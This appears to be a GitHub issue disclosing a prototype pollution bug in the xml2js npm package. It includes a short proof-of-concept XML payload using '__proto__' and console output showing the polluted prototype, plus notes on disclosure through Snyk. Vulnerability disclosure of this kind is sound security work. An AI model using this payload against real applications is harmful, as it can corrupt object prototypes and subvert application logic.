This package was also found to be vulnerable to the exact same vuln prototype pollution  (fast-xml-parser).
This one offers the same features like we have in fast-xml-parser, converting xml to js object.

https://www.npmjs.com/package/xml2js

![image](https://user-images.githubusercontent.com/31372554/232061839-ea220cb5-8ba8-4fbc-89ea-6f97c7267437.png)


Here are the details, the vulnerability is prototype pollution.

Taking an example code from the github repo to demonstrate the bug:



```js
var parseString = require('xml2js').parseString;
var xml = "<__proto__><polluted>hacked</polluted></__proto__>"
parseString(xml, function (err, result) {
    console.dir(result);
});
```




In the attached screenshot you can see the `result` object was polluted with a new property.

```js
result
>{}
result.__proto__
>{polluted: 'hacked'}
result.__proto__.polluted
>'hacked'
```

More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/



It was really hard to get in contact with the maintainer,so I took help of Snyk Vulnerability Disclosure (https://snyk.io/vulnerability-disclosure/). I forwarded them the details in the end of Feb 2023 and recived more information on 10 Apr

![image](https://user-images.githubusercontent.com/31372554/232063590-87222517-f0ce-4864-af0e-b91baf9044ee.png)

So it seems this was already reported by some other researcher way back in 2020 : https://security.snyk.io/vuln/SNYK-JS-XML2JS-5414874

https://github.com/Leonidas-from-XIV/node-xml2js/issues/593


